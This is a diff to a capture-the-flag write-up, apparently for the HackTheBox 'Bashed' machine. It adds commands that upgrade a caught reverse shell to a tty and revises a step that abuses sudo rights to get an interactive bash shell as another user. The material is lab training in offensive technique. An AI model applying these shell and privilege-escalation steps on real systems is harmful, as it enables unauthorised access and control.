@@ -315,6 +315,14 @@ www-data@bashed:/var/www/html/dev$
 
 It caught the reverse shell!
 
+### Stabilizing the shell
+
+I'll use this one-liner to stabilize a bit the shell by spawning a tty:
+
+```sh
+script "/dev/null" -qc "/bin/bash"
+```
+
 ## Getting a lay of the land
 
 If we run `whoami`, we see that we got a foothold as `www-data`.
@@ -602,13 +610,18 @@ We can run anything as `scriptmanager`!
 
 ### Exploitation
 
-Let's abuse our `sudo` permissions to impersonate `scriptmanager`.
+Let's abuse our `sudo` permissions to execute `/bin/bash` as `scriptmanager`.
 
 ```sh
-www-data@bashed:/var/www/html/dev$ sudo -u "scriptmanager" "/bin/bash"
+www-data@bashed:/var/www/html/dev$ sudo -u "scriptmanager" "/bin/bash" "-i"
 ```
 
-Now we're `scriptmanager`!
+```
+<SNIP>
+scriptmanager@bashed:/var/www/html/dev$
+```
+
+Now we have a shell as `scriptmanager`!
 
 ## System enumeration
 
@@ -682,6 +695,14 @@ root@bashed:/scripts#
 ```
 
 It caught the reverse shell!
+
+### Stabilizing the shell
+
+I'll use this one-liner to stabilize a bit the shell by spawning a tty:
+
+```sh
+script "/dev/null" -qc "/bin/bash"
+```
 
 ## System enumeration
 
